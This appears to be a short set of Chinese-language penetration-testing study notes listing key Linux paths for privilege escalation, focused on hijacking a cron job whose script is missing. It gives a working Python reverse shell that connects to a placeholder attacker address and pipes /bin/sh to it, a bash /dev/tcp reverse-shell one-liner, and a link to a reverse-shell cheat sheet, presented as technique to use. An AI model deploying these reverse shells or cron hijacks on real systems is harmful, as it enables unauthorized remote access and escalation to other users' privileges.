# 重要目录

1. `bin/sh`：运行这个文件，得到一个命令行
2. `/etc/crontab`：系统定期执行的任务，不同用户有各自定时任务（root权限编辑）
    
    <aside>
    💡 编写反弹Shell，netcat监听获取对应用户权限
    
    </aside>
    
    1. 如果crontab设定的定时计划文件，在真实目录中不存在，则可以创建该文件，编辑反弹Shell代码，让主机自动定时执行，攻击机netcat监听端口，获得原定时任务对应用户身份的Shell
        
        ```python
        ——反弹Shell书写方式——
        # (书写环境变量)
        #!/usr/bin/python
        import os, subprocess, socket
        # (创建套接字，并使其连接攻击机监听的端口)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("attacker_ip", "attacket_listening_port"))
        # (将套接字传回的文件，文件描述符添加上0，1，2，服从标准输入输出与报错)
        # (Linux文件描述符：0为stdin，1为stdout，2为stderr)
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        # (使用子进程调用交互模式的Shell，即执行成功返回结果，失败返回错误)
        p = subprocess.call(["/bin/sh", "-i"])
        ```
        
        其他语言可参考：[Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
        
        ```bash
        bash -c 'exec bash -i >& /dev/tcp/[local_ip]/[port] 0>&1'
        ```
        
    2. 如果crontab设定的定时执行文件存在，切换到对应目录，查看当前用户是否具有读写权限
3. `/etc/passwd`：用户列表
4. `/etc/group`：所有用户组
5. `/tmp`：残留缓存文件